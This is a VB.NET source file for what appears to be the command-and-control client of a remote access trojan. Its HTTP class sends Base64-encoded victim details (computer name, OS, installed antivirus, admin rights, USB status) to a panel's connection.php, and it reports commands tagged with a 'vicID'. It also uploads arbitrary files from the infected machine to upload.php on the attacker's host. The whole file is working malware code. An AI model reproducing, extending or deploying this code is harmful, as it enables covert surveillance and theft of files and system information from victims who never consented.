﻿Imports System.Net
Imports System.Text
Namespace HTTPSocket
    Public Class HTTP
        Public ID As String
        Public Host As String
        Public C_Password As String
        Dim Socket As New WebClient
        Public Function Connect()
            Try
                _GET("connection.php?data=" & ENB(ID & "|BN|" & My.Computer.Name & "|BN|" & My.Computer.Info.OSFullName & "|BN|" & Form1.GetAntiVirus() & "|BN|Online" & "|BN|" & Form1.checkUSB() & "|BN|" & Form1.checkadmin))
                Return True
            Catch ex As Exception
                Return False
            End Try
        End Function

        Public Function ENB(ByRef s As String) As String
            Dim byt As Byte() = System.Text.Encoding.UTF8.GetBytes(s)
            ENB = Convert.ToBase64String(byt)
        End Function
        Public Function DEB(ByRef s As String) As String
            Dim b As Byte() = Convert.FromBase64String(s)
            DEB = System.Text.Encoding.UTF8.GetString(b)
        End Function
        Public Function _GET(ByVal request As String)
            Try
                Return Socket.DownloadString(Host & "/" & request)
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function
        Public Function _POST(ByVal requst As String)
            Try
                Dim s As HttpWebRequest
                Dim enc As UTF8Encoding
                Dim postdata As String
                Dim postdatabytes As Byte()
                s = HttpWebRequest.Create(Host & "/" & "post.php")
                enc = New UTF8Encoding()
                postdata = requst
                postdatabytes = enc.GetBytes(postdata)
                s.Method = "POST"
                s.ContentType = "application/x-www-form-urlencoded"
                s.ContentLength = postdatabytes.Length

                Using stream = s.GetRequestStream()
                    stream.Write(postdatabytes, 0, postdatabytes.Length)
                End Using
                Dim result = s.GetResponse()
                Return result
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function
        Public Function Send(ByVal Command As String)
            Try
                Socket.DownloadString(Host & "/" & "receive.php?command=" & ENB(Command) & "&vicID=" & ENB(ID))
                Return True
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function
        Public Function Upload(ByVal Filepath As String)
            Try
                Socket.UploadFile(Host & "/upload.php?id=" & ENB(ID), Filepath)
                Return True
            Catch ex As WebException
                Return ex.Message
            End Try
        End Function
        Public Function Log(ByVal Type As String, ByVal Message As String)
            Send("NewLog" & "|BN|" & Type & "|BN|" & Message)
            Return True
        End Function
        Public Function IsPanel(ByVal PanelURL As String)
            Dim url As New System.Uri(PanelURL)
            Dim req As System.Net.WebRequest
            req = System.Net.WebRequest.Create(url)
            Dim resp As System.Net.WebResponse
            Try
                resp = req.GetResponse()
                resp.Close()
                req = Nothing
                Return True
            Catch ex As WebException
                req = Nothing
                Return False
            End Try
            Return ""
        End Function
    End Class
End Namespace